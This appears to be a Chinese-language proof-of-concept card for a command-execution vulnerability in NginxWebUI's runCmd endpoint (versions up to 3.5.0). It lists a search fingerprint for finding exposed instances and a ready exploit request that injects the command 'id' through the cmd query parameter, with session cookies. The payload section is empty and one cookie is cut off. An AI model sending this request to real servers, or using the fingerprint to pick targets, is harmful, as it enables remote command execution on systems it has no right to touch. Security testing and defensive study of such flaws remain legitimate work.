# nginxWebUIrunCmd命令执行漏洞

- **系统**：nginxWebUIrunCmd　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="NginxWebUI"`
- **请求**：`GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: SOLONID=2d074d89ecd545eaa2214312c9d1c47d; SOLONID2=4e09cf24e4fecc4f26fd605eb3b86…`

**请求体 / payload**
```

```

**其他**
- nginxWebUI runCmd命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * nginxWebUI <= 3.5.0